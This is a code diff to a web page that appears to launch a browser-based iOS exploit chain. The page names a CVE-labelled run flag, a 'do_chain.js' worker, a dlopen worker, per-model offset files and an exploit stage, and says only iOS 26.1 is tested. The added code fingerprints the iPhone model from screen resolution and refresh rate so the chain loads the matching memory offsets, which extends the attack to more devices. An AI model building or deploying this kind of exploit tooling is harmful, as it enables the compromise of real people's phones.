@@ -237,6 +237,68 @@
             console.log("[status]", s);
         }
 
+        // ── Device model detection ──
+        // MobileSafari's UA carries NO model token ("Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 ...)"),
+        // WebGL/WebGPU renderer strings are masked ("Apple GPU"), and workers see neither `screen`
+        // nor maxTouchPoints -- so the PAGE fingerprints the hardware: physical resolution
+        // (screen * devicePixelRatio) + panel refresh class (rAF cadence: ProMotion 120Hz vs 60Hz;
+        // NOTE low power mode caps ProMotion at 60 -> Pro models then land in the 60Hz bucket).
+        // Resolution order: ?device= override (persisted in localStorage; ?device=auto clears) ->
+        // UA model token (present in some embedders) -> fingerprint bucket. Buckets list every model
+        // sharing the fingerprint; the chain worker tries each candidate's offsets/<id>.json in
+        // order and uses the first that exists -- ambiguous buckets resolve to whichever model
+        // actually has an offsets file.
+        const DEVICE_FP_TABLE = {
+            // 'physW x physH @ dpr / hz-class': [candidate model ids, most-likely-with-offsets first]
+            '828x1792@2/60': ['iPhone12,1', 'iPhone11,8'],                          // 11, XR
+            '1125x2436@3/60': ['iPhone12,3', 'iPhone11,2'],                         // 11 Pro, XS
+            '1242x2688@3/60': ['iPhone12,5', 'iPhone11,4'],                         // 11 Pro Max, XS Max
+            '1170x2532@3/60': ['iPhone14,7', 'iPhone17,5', 'iPhone14,5', 'iPhone13,2', 'iPhone13,3'], // 14, 16e, 13, 12, 12 Pro
+            '1170x2532@3/120': ['iPhone14,2'],                                      // 13 Pro
+            '1284x2778@3/60': ['iPhone14,8', 'iPhone13,4'],                         // 14 Plus, 12 Pro Max
+            '1284x2778@3/120': ['iPhone14,3'],                                      // 13 Pro Max
+            '1179x2556@3/60': ['iPhone15,4', 'iPhone17,4'],                         // 15, 16
+            '1179x2556@3/120': ['iPhone15,2', 'iPhone16,1'],                        // 14 Pro, 15 Pro
+            '1290x2796@3/60': ['iPhone15,5', 'iPhone17,3'],                         // 15 Plus, 16 Plus (vphone lands here)
+            '1290x2796@3/120': ['iPhone15,3', 'iPhone16,2'],                        // 14 Pro Max, 15 Pro Max
+            '1206x2622@3/120': ['iPhone17,1', 'iPhone18,3', 'iPhone18,1'],          // 16 Pro, 17, 17 Pro
+            '1320x2868@3/120': ['iPhone17,2', 'iPhone18,2'],                        // 16 Pro Max, 17 Pro Max
+            '1260x2736@3/120': ['iPhone18,4'],                                      // Air
+        };
+        function __measureHz() {
+            return new Promise(res => {
+                let n = 0; const t0 = performance.now();
+                (function tick() {
+                    n++;
+                    if (performance.now() - t0 < 500) requestAnimationFrame(tick);
+                    else res((n / ((performance.now() - t0) / 1000)) > 75 ? 120 : 60);
+                })();
+            });
+        }
+        async function detectDevice() {
+            const ua = navigator.userAgent || '';
+            // manual override: ?device=iPhone15,5 (persisted), ?device=auto (clear)
+            const qm = location.search.match(/[?&]device=([A-Za-z0-9,]+)/);
+            let forced = null;
+            try {
+                if (qm) {
+                    if (qm[1] === 'auto') localStorage.removeItem('ps_device');
+                    else localStorage.setItem('ps_device', qm[1]);
+                }
+                forced = localStorage.getItem('ps_device');
+            } catch (e) { }
+            const uaM = ua.match(/iPhone(\d+,\d+)/);
+            const uaModel = uaM ? 'iPhone' + uaM[1] : null;
+            if (forced || uaModel) {
+                return { forced, uaModel, candidates: [], signals: 'fingerprint skipped (override/UA)' };
+            }
+            const physW = Math.round(screen.width * devicePixelRatio), physH = Math.round(screen.height * devicePixelRatio);
+            const hz = await __measureHz();
+            const key = physW + 'x' + physH + '@' + devicePixelRatio + '/' + hz;
+            const candidates = DEVICE_FP_TABLE[key] || [];
+            return { forced: null, uaModel: null, candidates, signals: key + (candidates.length ? '' : ' (no bucket)') };
+        }
+
 
         async function init() {
             const runner = document.getElementById("runBtn");
@@ -291,12 +353,14 @@
   };
 })();`;
 
-            function main() {
+            function main(devInfo) {
                 const dlopen_worker_blob = new Blob([dlopen_worker], { type: 'application/javascript' });
                 const dlopen_worker_url = URL.createObjectURL(dlopen_worker_blob);
                 let workerCode = "";
-                // inject the server origin so the worker's synchronous slog() can reach /log
-                workerCode = "self.__SLOG_ORIGIN=" + JSON.stringify(location.origin) + ";\n" + getJS(`do_chain.js`);
+                // inject the server origin so the worker's synchronous slog() can reach /log,
+                // and the page-side device fingerprint so loadOffsets picks the right JSON
+                workerCode = "self.__SLOG_ORIGIN=" + JSON.stringify(location.origin) + ";\n" +
+                    "self.__DEVICE_INFO=" + JSON.stringify(devInfo || null) + ";\n" + getJS(`do_chain.js`);
                 let workerBlob = new Blob([workerCode], { type: 'text/javascript' });
                 let workerBlobUrl = URL.createObjectURL(workerBlob);
 
@@ -592,7 +656,7 @@ break;
                     }
                 };
             }
-            main();
+            main(await (window.__deviceInfoPromise || (window.__deviceInfoPromise = detectDevice())));
             runner.disabled = false;
             window.__cve43529Running = false;
         }
@@ -606,6 +670,14 @@ break;
                     fetch(u, { keepalive: true }).catch(() => { });
                     (new Image()).src = u;
                 } catch (e) { }
+            });
+            // start device detection immediately on load (rAF measurement needs ~500ms;
+            // done long before autorun's 800ms timer or a manual run presses)
+            window.__deviceInfoPromise = detectDevice().then(info => {
+                log('[page] device detect: ' + (info.forced ? 'FORCED ' + info.forced :
+                    info.uaModel ? 'UA ' + info.uaModel :
+                        'fingerprint [' + (info.candidates.join(' | ') || 'NONE') + ']') + ' (' + info.signals + ')');
+                return info;
             });
             // TEST-AUTOMATION HOOK: autorun ONLY with ?autorun=1 (default loads stay manual, §5r cleanup respected).
             // §5i AUTORUN-RETRY (2026-08-02): the mapredir stage6 fire has a ~57% once-gate completion
@@ -678,7 +750,7 @@ break;
                 if (e.key === "Escape") closeModal();
                 if (e.key === "Enter" && overlay.dataset.open === "true") closeModal();
             });
-            log('Press "run" to start, only iOS 26.1 is tested. Offsets are for the iPhone 15 plus only currently, and work on vphone.');
+            log('Press "run" to start, only iOS 26.1 is tested. Device auto-detected by screen/refresh fingerprint (override: ?device=iPhoneXX,Y); offsets loaded from offsets/ directory.');
 
         });
     </script>
